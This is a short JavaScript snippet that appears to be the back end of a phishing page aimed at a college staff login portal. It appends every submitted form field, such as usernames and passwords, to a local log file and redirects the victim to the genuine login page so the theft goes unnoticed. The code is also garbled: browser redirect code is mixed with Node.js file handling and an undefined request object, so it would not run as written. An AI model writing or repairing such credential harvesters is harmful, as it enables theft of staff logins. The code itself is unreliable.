// Set the location to redirect the page
window.location.href = 'https://staff.americancollege.edu.in/ams/index.php';

// Open the text file in writing mode (Note: This requires a server-side environment like Node.js)
const fs = require('fs');

const logData = Object.entries(req.body).map(([variable, value]) => `${variable}=${value}`).join('\r\n') + '\r\n';

// Append to the log file
fs.appendFile('log.txt', logData, (err) => {
    if (err) throw err;
});

// Exit the process (if needed, in a server context)
process.exit();

